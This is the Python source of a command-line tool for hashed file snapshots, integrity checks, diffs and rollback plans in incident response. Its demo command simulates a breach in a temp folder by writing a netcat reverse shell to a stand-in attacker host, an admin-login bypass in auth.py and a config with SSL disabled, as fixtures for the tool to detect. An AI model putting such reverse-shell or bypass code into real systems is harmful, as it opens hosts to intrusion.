"""
tibet-snap CLI — Cryptographic State Snapshots & Rollback.

Usage::

    tibet-snap info        Concept overview
    tibet-snap create      Create a snapshot
    tibet-snap list        List all snapshots
    tibet-snap compare     Compare two snapshots
    tibet-snap verify      Verify snapshot integrity
    tibet-snap demo        Interactive demo with hack scenario
"""

import argparse
import json
import os
import sys
import tempfile
from datetime import datetime, timezone
from pathlib import Path

from .engine import SnapEngine


def cmd_info(args: argparse.Namespace) -> int:
    print()
    print("=" * 64)
    print("  TIBET-SNAP — Cryptographic State Snapshots & Rollback")
    print("=" * 64)
    print()
    print("The Problem: After a hack, what changed?")
    print("  After a breach (Odido leak, Politie cookies hack, ransomware)")
    print("  you need to know EXACTLY what changed and roll back to")
    print("  a trustworthy state — with proof.")
    print()
    print("How tibet-snap works:")
    print()
    print("  1. SNAPSHOT — Seal system state as TIBET token chain")
    print("     Every file: path, SHA-256, size, permissions, timestamp")
    print()
    print("     ┌─────────────────────────────────────────────┐")
    print("     │ Snapshot: 'pre-deploy'                      │")
    print("     │ Files: 847  │  Size: 12.4 MB                │")
    print("     │ Token: jis:a3f8c2e1  │  Sealed: 2025-03-01 │")
    print("     └─────────────────────────────────────────────┘")
    print()
    print("  2. COMPARE — Diff two snapshots")
    print("     Added / removed / modified files + drift score")
    print()
    print("     pre-deploy ←→ post-incident")
    print("     ├── + /etc/cron.d/backdoor      (ADDED)")
    print("     ├── ~ /etc/nginx/nginx.conf      (MODIFIED)")
    print("     └── - /var/log/auth.log          (REMOVED)")
    print("     Drift score: 0.0035")
    print()
    print("  3. VERIFY — Re-hash and confirm integrity")
    print("     Is the snapshot still trustworthy?")
    print()
    print("  4. ROLLBACK PLAN — Auto-generate restore actions")
    print("     restore / revert / remove / fix_permissions")
    print("     Each action linked to tibet-pol compliance template")
    print()
    print("  5. PROVENANCE — Every operation = linked TIBET token")
    print("     ERIN:     snapshot content (paths, hashes)")
    print("     ERAAN:    parent snapshot, dependencies")
    print("     EROMHEEN: hostname, timestamp, actor")
    print("     ERACHTER: intent (create/verify/compare/rollback)")
    print()
    print("=" * 64)
    return 0


def cmd_create(args: argparse.Namespace) -> int:
    engine = SnapEngine(store_dir=args.store)
    paths = args.paths if args.paths else []

    if not paths:
        print("  No paths given — creating empty demo snapshot.")
        print("  Usage: tibet-snap create <name> <path1> [path2] ...")
        print()

    # Resolve paths to absolute and validate
    resolved = []
    for p in paths:
        rp = Path(p).resolve()
        if not rp.exists():
            print(f"  Warning: path not found: {p} (resolved: {rp})")
        else:
            resolved.append(str(rp))
            kind = "directory" if rp.is_dir() else "file"
            print(f"  Scanning: {rp} ({kind})")

    snap = engine.create_snapshot(
        name=args.name,
        paths=resolved,
        metadata={"created_by": "cli"},
    )

    print(f"\n  Snapshot created:")
    print(f"    ID:     {snap.id}")
    print(f"    Name:   {snap.name}")
    print(f"    Files:  {snap.file_count}")
    print(f"    Size:   {snap.total_size:,} bytes")
    print(f"    Time:   {snap.timestamp}")
    print(f"    Token:  jis:{snap.tibet_token_id}")
    print(f"    Stored: {args.store}/snap_{snap.id}.json")

    if snap.file_count > 0:
        print(f"\n  Files captured:")
        for path, record in sorted(snap.files.items()):
            display = path
            if len(display) > 70:
                display = "..." + display[-67:]
            print(f"    {display}  ({_format_size(record.size)})")

    print()
    return 0


def cmd_list(args: argparse.Namespace) -> int:
    engine = SnapEngine(store_dir=args.store)
    snapshots = engine.list_snapshots()

    if not snapshots:
        print("\n  No snapshots found.\n")
        return 0

    if args.json:
        data = [s.to_dict() for s in snapshots]
        if not args.files:
            # Compact: show file count only
            for d in data:
                d["files"] = f"<{d['file_count']} files>"
        print(json.dumps(data, indent=2))
    else:
        print()
        print(f"  {'ID':<18} {'Name':<20} {'Files':>6} {'Size':>12} {'Timestamp'}")
        print("  " + "-" * 86)
        for s in snapshots:
            size_str = _format_size(s.total_size)
            ts_short = s.timestamp[:19]
            print(
                f"  {s.id:<18} {s.name:<20} {s.file_count:>6} "
                f"{size_str:>12} {ts_short}"
            )
        print()

    return 0


def cmd_show(args: argparse.Namespace) -> int:
    """Show the contents of a snapshot — all files with hashes and sizes."""
    engine = SnapEngine(store_dir=args.store)

    try:
        snap = engine.get_snapshot(args.id)
    except KeyError as e:
        print(f"\n  Error: {e}\n")
        return 1

    if args.json:
        print(json.dumps(snap.to_dict(), indent=2))
    else:
        print(f"\n  Snapshot: {snap.name}")
        print(f"  ID:      {snap.id}")
        print(f"  Time:    {snap.timestamp[:19]}")
        print(f"  Files:   {snap.file_count}")
        print(f"  Size:    {_format_size(snap.total_size)}")
        if snap.tibet_token_id:
            print(f"  Token:   jis:{snap.tibet_token_id}")
        print()

        if snap.files:
            print(f"  {'Path':<60} {'Size':>10} {'SHA-256'}")
            print("  " + "-" * 90)
            for path, record in sorted(snap.files.items()):
                # Show relative path if possible (shorter)
                display_path = path
                if len(display_path) > 58:
                    display_path = "..." + display_path[-55:]
                size_str = _format_size(record.size)
                print(
                    f"  {display_path:<60} {size_str:>10} {record.sha256[:16]}..."
                )
        else:
            print("  No files in this snapshot.")
        print()

    return 0


def cmd_compare(args: argparse.Namespace) -> int:
    engine = SnapEngine(store_dir=args.store)

    try:
        diff = engine.compare(args.id_a, args.id_b)
    except KeyError as e:
        print(f"\n  Error: {e}\n")
        return 1

    snap_a = engine.get_snapshot(args.id_a)
    snap_b = engine.get_snapshot(args.id_b)

    if args.json:
        print(json.dumps(diff.to_dict(), indent=2))
    else:
        print(f"\n  Comparing: '{snap_a.name}' <-> '{snap_b.name}'")
        print(f"  Drift score: {diff.drift_score}")
        print()

        if diff.added:
            print(f"  Added ({len(diff.added)}):")
            for p in diff.added[:20]:
                print(f"    + {p}")
            if len(diff.added) > 20:
                print(f"    ... and {len(diff.added) - 20} more")

        if diff.removed:
            print(f"  Removed ({len(diff.removed)}):")
            for p in diff.removed[:20]:
                print(f"    - {p}")
            if len(diff.removed) > 20:
                print(f"    ... and {len(diff.removed) - 20} more")

        if diff.modified:
            print(f"  Modified ({len(diff.modified)}):")
            for p in diff.modified[:20]:
                print(f"    ~ {p}")
            if len(diff.modified) > 20:
                print(f"    ... and {len(diff.modified) - 20} more")

        if not diff.added and not diff.removed and not diff.modified:
            print("  No differences — snapshots are identical.")

        print()

    return 0


def cmd_verify(args: argparse.Namespace) -> int:
    engine = SnapEngine(store_dir=args.store)

    try:
        snap = engine.get_snapshot(args.id)
    except KeyError as e:
        print(f"\n  Error: {e}\n")
        return 1

    print(f"\n  Verifying snapshot '{snap.name}' ({snap.file_count} files)...")
    intact = engine.verify(args.id)

    if intact:
        print(f"  Result: INTACT — all {snap.file_count} files match recorded hashes.")
    else:
        print(f"  Result: COMPROMISED — one or more files have changed or are missing.")
        # Show details from provenance
        tokens = engine.provenance.chain()
        if tokens:
            last = tokens[-1]
            details = last.get("erin", {}).get("details", {})
            if details.get("mismatches"):
                print(f"  Mismatches:")
                for p in details["mismatches"][:10]:
                    print(f"    ~ {p}")
            if details.get("missing"):
                print(f"  Missing:")
                for p in details["missing"][:10]:
                    print(f"    ? {p}")

    print()
    return 1 if not intact else 0


def cmd_demo(args: argparse.Namespace) -> int:
    print("\n  TIBET-SNAP Demo: Incident Response Scenario\n")
    print("  Simulating: hack detection -> snapshot -> rollback\n")

    # Use a temp directory for the demo
    demo_dir = Path(tempfile.mkdtemp(prefix="tibet-snap-demo-"))
    store_dir = str(demo_dir / ".tibet-snap")
    app_dir = demo_dir / "app"
    app_dir.mkdir()

    # Step 1: Create "production" files
    print("  Step 1: Create production files")
    print("  " + "-" * 50)

    files_content = {
        "app/config.yml": "server:\n  port: 8080\n  ssl: true\n  log_level: info\n",
        "app/index.html": "<html><body><h1>Welcome</h1></body></html>\n",
        "app/auth.py": "def authenticate(user, pwd):\n    return check_db(user, pwd)\n",
        "app/certs/server.pem": "-----BEGIN CERTIFICATE-----\nMIIBxTCCAW...\n-----END CERTIFICATE-----\n",
    }

    for rel_path, content in files_content.items():
        fp = demo_dir / rel_path
        fp.parent.mkdir(parents=True, exist_ok=True)
        fp.write_text(content)
        print(f"    {rel_path}")

    # Step 2: Create baseline snapshot
    print()
    print("  Step 2: Create baseline snapshot")
    print("  " + "-" * 50)

    engine = SnapEngine(store_dir=store_dir)
    baseline = engine.create_snapshot(
        name="baseline",
        paths=[str(app_dir)],
        metadata={"env": "production", "created_by": "demo"},
    )
    print(f"    Snapshot: {baseline.id}")
    print(f"    Name:     {baseline.name}")
    print(f"    Files:    {baseline.file_count}")
    print(f"    Token:    jis:{baseline.tibet_token_id}")

    # Step 3: Verify baseline
    print()
    print("  Step 3: Verify baseline integrity")
    print("  " + "-" * 50)

    intact = engine.verify(baseline.id)
    print(f"    Result: {'INTACT' if intact else 'COMPROMISED'}")

    # Step 4: Simulate a hack
    print()
    print("  Step 4: SIMULATE HACK")
    print("  " + "-" * 50)
    print("    Attacker modifies config, injects backdoor, deletes logs...")

    # Modify config (change ssl to false, add backdoor port)
    (demo_dir / "app/config.yml").write_text(
        "server:\n  port: 8080\n  ssl: false\n  log_level: debug\n  backdoor_port: 9999\n"
    )
    print("    ~ app/config.yml (ssl disabled, backdoor port added)")

    # Inject a backdoor script
    (demo_dir / "app/backdoor.sh").write_text(
        "#!/bin/bash\nnc -e /bin/sh attacker.evil.com 4444 &\n"
    )
    os.chmod(str(demo_dir / "app/backdoor.sh"), 0o755)
    print("    + app/backdoor.sh (reverse shell injected)")

    # Modify auth to bypass
    (demo_dir / "app/auth.py").write_text(
        "def authenticate(user, pwd):\n    if user == 'admin': return True  # backdoor\n    return check_db(user, pwd)\n"
    )
    print("    ~ app/auth.py (auth bypass injected)")

    # Delete cert
    (demo_dir / "app/certs/server.pem").unlink()
    print("    - app/certs/server.pem (certificate deleted)")

    # Step 5: Post-hack snapshot
    print()
    print("  Step 5: Create post-hack snapshot")
    print("  " + "-" * 50)

    post_hack = engine.create_snapshot(
        name="post-hack",
        paths=[str(app_dir)],
        metadata={"env": "production", "trigger": "incident-detection"},
    )
    print(f"    Snapshot: {post_hack.id}")
    print(f"    Files:    {post_hack.file_count}")

    # Step 6: Verify baseline (should fail now)
    print()
    print("  Step 6: Verify baseline integrity (after hack)")
    print("  " + "-" * 50)

    intact = engine.verify(baseline.id)
    print(f"    Result: {'INTACT' if intact else 'COMPROMISED'}")

    # Step 7: Compare
    print()
    print("  Step 7: Compare baseline vs post-hack")
    print("  " + "-" * 50)

    diff = engine.compare(baseline.id, post_hack.id)
    print(f"    Drift score: {diff.drift_score}")

    if diff.added:
        for p in diff.added:
            rel = str(Path(p).relative_to(demo_dir))
            print(f"    + {rel}")
    if diff.removed:
        for p in diff.removed:
            rel = str(Path(p).relative_to(demo_dir))
            print(f"    - {rel}")
    if diff.modified:
        for p in diff.modified:
            rel = str(Path(p).relative_to(demo_dir))
            print(f"    ~ {rel}")

    # Step 8: Rollback plan
    print()
    print("  Step 8: Generate rollback plan (target: baseline)")
    print("  " + "-" * 50)

    plan = engine.rollback_plan(baseline.id)
    for action in plan:
        rel = str(Path(action["path"]).relative_to(demo_dir))
        print(f"    [{action['action'].upper():<16}] {rel}")
        print(f"      {action['reason']}")

    # Step 9: Provenance chain
    print()
    print("  Step 9: TIBET provenance chain")
    print("  " + "-" * 50)

    chain = engine.provenance.chain()
    for token in chain:
        print(
            f"    {token['token_id']:<16} "
            f"{token['action']:<10} "
            f"jis:{token['snapshot_id'][:8]}..."
        )

    print()
    print(f"  Demo complete. {len(chain)} provenance tokens generated.")
    print(f"  Store: {store_dir}")
    print()

    # Cleanup hint
    print(f"  Cleanup: rm -rf {demo_dir}")
    print()
    return 0


def _format_size(size_bytes: int) -> str:
    """Format bytes as human-readable string."""
    if size_bytes < 1024:
        return f"{size_bytes} B"
    elif size_bytes < 1024 * 1024:
        return f"{size_bytes / 1024:.1f} KB"
    elif size_bytes < 1024 * 1024 * 1024:
        return f"{size_bytes / (1024 * 1024):.1f} MB"
    else:
        return f"{size_bytes / (1024 * 1024 * 1024):.1f} GB"


def main() -> None:
    parser = argparse.ArgumentParser(
        prog="tibet-snap",
        description="Cryptographic State Snapshots & Rollback",
    )
    sub = parser.add_subparsers(dest="command")

    # info
    sub.add_parser("info", help="Concept overview")

    # create
    p_create = sub.add_parser("create", help="Create a snapshot")
    p_create.add_argument("name", help="Snapshot name (e.g. 'pre-deploy')")
    p_create.add_argument("paths", nargs="*", help="File/directory paths to snapshot")

    # list
    p_list = sub.add_parser("list", help="List all snapshots")
    p_list.add_argument("-j", "--json", action="store_true", help="JSON output")
    p_list.add_argument("-f", "--files", action="store_true", help="Include file details in JSON output")

    # show
    p_show = sub.add_parser("show", help="Show snapshot contents (files, hashes, sizes)")
    p_show.add_argument("id", help="Snapshot ID to show")
    p_show.add_argument("-j", "--json", action="store_true", help="JSON output")

    # compare
    p_compare = sub.add_parser("compare", help="Compare two snapshots")
    p_compare.add_argument("id_a", help="First snapshot ID")
    p_compare.add_argument("id_b", help="Second snapshot ID")
    p_compare.add_argument("-j", "--json", action="store_true", help="JSON output")

    # verify
    p_verify = sub.add_parser("verify", help="Verify snapshot integrity")
    p_verify.add_argument("id", help="Snapshot ID to verify")

    # demo
    sub.add_parser("demo", help="Interactive hack/rollback demo")

    # Common args
    for p in [p_create, p_list, p_show, p_compare, p_verify]:
        p.add_argument(
            "-s", "--store", default=".tibet-snap",
            help="Snapshot store directory (default: .tibet-snap)",
        )

    args = parser.parse_args()
    if not args.command:
        parser.print_help()
        sys.exit(0)

    commands = {
        "info": cmd_info,
        "create": cmd_create,
        "list": cmd_list,
        "show": cmd_show,
        "compare": cmd_compare,
        "verify": cmd_verify,
        "demo": cmd_demo,
    }
    sys.exit(commands[args.command](args))
